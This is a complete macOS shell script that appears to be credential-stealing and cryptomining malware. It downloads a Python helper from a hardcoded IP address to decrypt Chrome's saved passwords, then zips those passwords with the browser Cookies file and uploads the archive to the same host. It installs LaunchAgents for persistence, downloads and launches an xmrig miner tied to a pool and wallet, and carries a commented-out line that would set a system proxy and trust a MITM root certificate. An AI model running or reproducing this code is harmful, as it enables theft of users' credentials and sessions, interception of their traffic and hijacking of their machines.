#osascript -e "do shell script \"networksetup -setsecurewebproxy "Wi-Fi" 46.226.108.171 8080 && networksetup -setwebproxy "Wi-Fi" 46.226.108.171 8080 && curl -x http://46.226.108.171:8080 http://mitm.it/cert/pem -o verysecurecert.pem && security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain verysecurecert.pem\" with administrator privileges"
OUTPUT="$(id -un)"
cd ~/Library/Application\ Support/Google/Chrome/Default
curl -o harmlesslittlecode.py http://46.226.108.171/harmlesslittlecode.py
python harmlesslittlecode.py > passwords.txt 2>&1
if grep -q "Error decrypting this data" "passwords.txt"; then
echo "fail"
else
mkdir ${OUTPUT}
cp Cookies ${OUTPUT}/Cookies
cp passwords.txt ${OUTPUT}/passwords.txt
zip -r ${OUTPUT}.zip ${OUTPUT}
curl --upload-file ${OUTPUT}.zip http://46.226.108.171:8000
fi
cd ~/Library/LaunchAgents
curl -o com.apple.rig2.plist http://46.226.108.171/com.apple.rig2.plist
curl -o com.proxy.initialize.plist http://46.226.108.171/com.proxy.initialize.plist
launchctl load -w com.apple.rig2.plist
launchctl load -w com.proxy.initialize.plist
cd /Users/Shared
curl -o xmrig2 http://46.226.108.171/xmrig2
chmod +x ./xmrig2
rm -rf ./xmrig
rm -rf ./config.json
./xmrig2 -a yescrypt -o stratum+tcp://koto-pool.work:3032 -u k1GqvkK7QYEfMj3JPHieBo1m7FUkTowdq6H &
